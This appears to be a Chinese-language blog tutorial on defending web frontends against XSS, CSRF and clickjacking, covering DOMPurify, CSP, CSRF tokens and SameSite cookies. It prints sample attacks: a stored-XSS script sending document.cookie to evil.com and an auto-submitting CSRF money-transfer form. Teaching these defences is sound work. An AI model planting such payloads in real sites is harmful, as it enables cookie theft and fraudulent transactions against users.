---
title: "前端安全：XSS、CSRF 完整防御方案"
date: 2019-07-26 10:36:28
tags:
  - 安全
readingTime: 2
description: "安全是后端的事？大错特错。很多 XSS 和 CSRF 漏洞是前端代码造成的，防御也要前端配合。"
---

安全是后端的事？大错特错。很多 XSS 和 CSRF 漏洞是前端代码造成的，防御也要前端配合。

## XSS（跨站脚本攻击）

攻击者在页面注入恶意脚本，在用户浏览器执行。

### 类型

```javascript
// 1. 存储型 XSS：恶意内容存入数据库
// 用户提交：<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
// 后端存储，其他用户访问时执行

// 2. 反射型 XSS：通过 URL 参数注入
// https://example.com/search?q=<script>alert(1)</script>
// 后端直接把 q 参数输出到 HTML

// 3. DOM 型 XSS：不经过服务器
// document.getElementById('content').innerHTML = location.hash  // 危险！
```

### 防御

```javascript
{% raw %}
// ❌ 危险：直接使用用户输入
element.innerHTML = userInput;
document.write(userInput);
eval(userInput);

// ✅ 安全：使用 textContent
element.textContent = userInput; // 自动转义，不解析 HTML

// ✅ 安全：需要富文本时，使用白名单过滤库
import DOMPurify from "dompurify";
element.innerHTML = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
  ALLOWED_ATTR: ["href", "target", "rel"],
});

// React/Vue 的 XSS 保护
// React：JSX 默认转义，dangerouslySetInnerHTML 才有风险
// Vue：{{ }} 默认转义，v-html 才有风险

// URL 参数用 encodeURIComponent
const url = `https://api.example.com/search?q=${encodeURIComponent(query)}`;
{% endraw %}
```

### Content Security Policy（CSP）

```html
<!-- 最强防御：浏览器级别的策略 -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'unsafe-inline';"
/>
```

```nginx
# 更好：通过 HTTP 响应头配置
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  img-src 'self' data: https:;
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

## CSRF（跨站请求伪造）

攻击者让已登录用户在不知情的情况下发起恶意请求。

```html
<!-- 攻击页面（evil.com）：用户访问这个页面就自动发起转账请求 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="hacker" />
  <input name="amount" value="10000" />
</form>
<script>
  document.forms[0].submit();
</script>
```

### CSRF Token 防御

```javascript
// 后端：生成随机 token 放入 Cookie 或隐藏表单字段
// 前端：每次请求携带 token

// axios 拦截器：自动添加 CSRF token
axios.interceptors.request.use((config) => {
  // 从 Cookie 读取 CSRF token（双重提交 Cookie 方案）
  const csrfToken = getCookie("csrf_token");
  if (csrfToken) {
    config.headers["X-CSRF-Token"] = csrfToken;
  }
  return config;
});
```

### SameSite Cookie

```javascript
// 后端设置 Cookie 的 SameSite 属性
// Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly

// Strict：完全禁止第三方 Cookie（来自其他域的请求不带 Cookie）
// Lax：大部分场景禁止，GET 导航除外（默认值）
// None：允许（需要 Secure）
```

SameSite=Lax 已经是现代浏览器的默认值，大大降低了 CSRF 风险。

## 点击劫持（Clickjacking）

```nginx
# 禁止页面被 iframe 嵌入
add_header X-Frame-Options "DENY" always;
# 或 CSP
add_header Content-Security-Policy "frame-ancestors 'none';" always;
```

## 安全检查清单

```
□ 不直接 innerHTML 用户输入，用 DOMPurify 过滤富文本
□ v-html / dangerouslySetInnerHTML 只用于可信内容
□ API 请求添加 CSRF Token 或依赖 SameSite Cookie
□ 设置 CSP 响应头
□ 设置 X-Frame-Options 防止点击劫持
□ Token 存 HttpOnly Cookie，不存 localStorage（防 XSS 偷取）
□ 敏感操作二次验证（密码、手机验证码）
□ npm audit 检查依赖漏洞
```

## 小结

- XSS：用 `textContent` 代替 `innerHTML`，富文本用白名单过滤，配置 CSP
- CSRF：SameSite Cookie + CSRF Token，现代浏览器已较好防御
- 安全不是"后端的事"，前端代码同样可能引入漏洞
